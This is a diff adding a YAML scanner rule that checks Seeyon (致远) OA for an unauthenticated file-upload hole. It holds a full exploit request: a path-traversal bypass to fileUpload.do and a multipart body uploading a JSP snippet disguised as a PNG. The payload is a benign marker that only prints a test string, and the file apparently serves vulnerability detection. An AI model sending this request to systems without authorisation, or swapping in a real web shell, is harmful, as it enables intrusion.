@@ -1,0 +1,14 @@
+name: 致远OA-fileUpload.do-文件上传
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: "--00content0boundary00\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"extensions\"\r\n\r\npng\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"applicationCategory\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"destDirectory\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"destFilename\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"maxSize\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"isEncrypt\"\r\n\r\nfalse\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"Rscan.png\"\r\nContent-Type: Content-Type: application/pdf\r\n\r\n<% out.println(\"Rscan_test\");%>\r\n--00content0boundary00--"
+    expression:
+      status: 200
+      body_all: ["Rscan.png"]
